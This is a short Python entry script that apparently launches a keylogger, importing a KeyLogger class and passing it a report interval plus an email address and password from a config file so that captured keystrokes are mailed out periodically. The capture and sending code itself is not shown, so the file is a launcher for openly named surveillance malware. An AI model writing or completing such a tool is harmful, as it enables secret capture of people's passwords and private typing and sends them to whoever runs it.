def main():
    import config as cfg
    from keylogger import KeyLogger

    keylogger = KeyLogger(cfg.SEND_REPORT_EVERY, cfg.EMAIL_ADDRESS, cfg.EMAIL_PASSWORD)
    keylogger.run()


if __name__ == "__main__":
    main()
